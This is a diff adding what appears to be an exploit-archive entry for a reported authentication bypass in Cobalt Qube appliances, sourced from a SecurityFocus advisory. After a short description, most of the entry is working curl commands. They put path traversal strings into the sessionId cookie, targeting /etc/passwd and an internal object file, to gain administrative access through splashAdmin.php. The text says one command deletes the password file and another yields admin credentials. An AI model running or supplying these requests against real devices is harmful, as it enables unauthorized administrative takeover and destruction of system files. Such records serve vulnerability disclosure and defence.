@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/5297/info
+
+A vulnerability has been reported for Cobalt Qube that may allow an attacker to bypass the authentication mechanism and obtain administrative privileges. 
+
+The vulnerability occurs because of a weak authentication mechanism with Cobalt Qube appliances. The authentication mechanism fails to properly validate the input supplied in the client cookie. Thus it is possible for an attacker to refer to a file on the filesystem as that containing the session key. This vulnerability may be exploited by remote attackers to obtain administrative privileges on the device.
+
+$curl -b sessionId=../../../../../../../../etc/passwd\;loginName=root:x:0:0:root:/root:/bin/bash
+http://192.168.0.1:444/splashAdmin.php
+
+This will allow the attacker to delete the password file.
+
+The following will enable the attacker to obtain administrative credentials on the vulnerable system.
+$curl -b sessionId=../codb/objects/4/.name\;loginName=admin
+http://192.168.0.1:444/splashAdmin.php
+
+$ curl -b sessionId=/../../../../../../tmp/test\;loginName=admin
+http://192.168.0.1:444/splashAdmin.php
